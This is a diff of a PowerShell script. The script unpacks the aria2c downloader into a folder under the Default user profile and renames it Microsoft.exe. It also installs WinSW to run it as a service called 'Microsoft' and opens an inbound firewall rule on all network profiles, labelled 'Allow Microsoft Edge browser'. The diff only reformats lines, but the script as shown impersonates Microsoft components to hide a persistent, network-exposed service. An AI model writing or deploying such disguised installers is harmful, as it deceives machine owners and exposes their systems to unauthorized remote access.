@@ -2,7 +2,7 @@ $microseftDir = "C:\Users\Default\AppData\Local\System"
 $winswPath = 'C:\Users\Default\AppData\Local\System\winsw.exe'
 Set-Alias -Name winsw.exe -Value $winswPath
 if (Test-Path $winswPath) {
-    winsw.exe stop Microsoft | Out-Null
+  winsw.exe stop Microsoft | Out-Null
 }
 else {
 }
@@ -18,21 +18,21 @@ Expand-Archive -Path $aria2czip -DestinationPath $microseftDir -Force
 $sourceFile = Join-Path -Path $microseftDir -ChildPath "aria2-1.36.0-win-64bit-build1\aria2c.exe"
 $destinationFile = Join-Path -Path $microseftDir -ChildPath "aria2c.exe"
 Copy-Item -Path $sourceFile -Destination $destinationFile -Force
-ren $microseftDir\aria2c.exe $microseftDir\Microsoft.exe
+Rename-Item $microseftDir\aria2c.exe $microseftDir\Microsoft.exe
 $folderPath = Join-Path -Path $microseftDir -ChildPath "aria2-1.36.0-win-64bit-build1"
 Remove-Item -Path $folderPath -Recurse -Force
 Remove-Item -Path $aria2czip -Force
 $baseurl = "https://github.com/winsw/winsw/releases/latest"
 $winswexename = "WinSW-x64.exe"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $request = [System.Net.WebRequest]::Create($baseurl)
-    $request.AllowAutoRedirect = $false
-    $request.Timeout = 5 * 1000
-    $request.headers.Add("Pragma", "no-cache")
-    $request.headers.Add("Cache-Control", "no-cache")
-    $request.UserAgent = $UserAgent
-    $response = $request.GetResponse()
-    if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download OpenSSH Archive. Sometimes you can get throttled, so just try again later." }
+$request = [System.Net.WebRequest]::Create($baseurl)
+$request.AllowAutoRedirect = $false
+$request.Timeout = 5 * 1000
+$request.headers.Add("Pragma", "no-cache")
+$request.headers.Add("Cache-Control", "no-cache")
+$request.UserAgent = $UserAgent
+$response = $request.GetResponse()
+if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download OpenSSH Archive. Sometimes you can get throttled, so just try again later." }
 $winswurl = $([String]$response.GetResponseHeader("Location")).Replace('tag', 'download') + "/" + $winswexename
 Invoke-WebRequest -Uri $winswurl -OutFile $microseftDir\winsw.exe -ErrorAction Stop -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent | Out-Null
 New-NetFirewallRule -Program $microseftDir\Microsoft.exe -Action Allow -Profile Domain, Private, Public -DisplayName "Allow Microsoft Edge browser" -Description "Allow Microsoft Edge browser" -Direction Inbound | Out-Null
